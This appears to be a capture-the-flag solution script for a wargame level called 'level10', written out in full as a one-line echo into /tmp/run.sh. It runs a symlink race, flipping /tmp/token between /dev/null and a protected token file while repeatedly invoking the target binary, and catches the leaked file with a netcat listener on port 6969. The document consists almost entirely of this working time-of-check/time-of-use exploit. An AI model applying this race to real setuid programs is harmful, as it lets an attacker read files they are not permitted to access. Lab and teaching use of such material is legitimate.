echo '
#!/usr/bin/env bash

run_netcat() {
  while :; do nc -l 6969; done
}

make_symlinks() {
  while :; do ln -sf /dev/null /tmp/token ; ln -sf /home/user/level10/token /tmp/token; done
}

run_flag() {
  while :; do /home/user/level10/level10 /tmp/token 0 > /dev/null 2>&1 ; done
}

run_netcat &
make_symlinks &
run_flag &

sleep 0.05
pkill -P $$ # Kill all children
' > /tmp/run.sh